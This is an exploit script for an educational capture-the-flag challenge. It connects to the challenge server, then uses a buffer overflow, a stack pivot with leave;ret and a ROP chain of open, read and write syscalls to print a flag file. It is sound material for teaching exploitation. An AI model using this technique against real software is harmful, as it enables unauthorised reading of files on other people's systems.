from pwn import *

context.arch = 'amd64'
r = remote('edu-ctf.zoolab.org', 10005)

ROP_addr = 0x4e3360
fn_addr = 0x4e3340

# ROPgadget --binary ./chal > out
pop_rdi_ret = 0x4038b3 # cat ./out | grep "pop rdi ; ret"
pop_rsi_ret = 0x402428 # cat ./out | grep "pop rsi ; ret"
# pop_rdx_ret: cat ./out | grep "pop rdx ; ret"
pop_rdx_rbx_ret = 0x493a2b # cat ./out | grep "pop rax ; pop rdx ; pop rbx ; ret"
pop_rax_ret = 0x45db87 # cat ./out | grep "pop rax ; ret"
leave_ret = 0x40190c # cat ./out | grep "leave ; ret"
syscall_ret = 0x4284b6 # cat ./out | grep "syscall ; ret"

ROP = flat(
    # open('/home/chal/flag', 0)
    pop_rdi_ret, fn_addr,
    pop_rsi_ret, 0,
    pop_rax_ret, 2,
    syscall_ret,
    # read(3, fn, 0x30)
    pop_rdi_ret, 3,
    pop_rsi_ret, fn_addr,
    pop_rdx_rbx_ret, 0x30, 0,
    pop_rax_ret, 0,
    syscall_ret,
    # write(1, fn, 0x30)
    pop_rdi_ret, 1,
    pop_rsi_ret, fn_addr,
    pop_rdx_rbx_ret, 0x30, 0,
    pop_rax_ret, 1,
    syscall_ret,
)
r.sendafter(b'Give me filename: ', b'/home/chal/flag\x00')
r.sendafter(b'Give me ROP: ', b'A'*0x8 + ROP)
r.sendafter(b'Give me overflow: ', b'A'*0x20 + p64(ROP_addr) + p64(leave_ret))
r.interactive()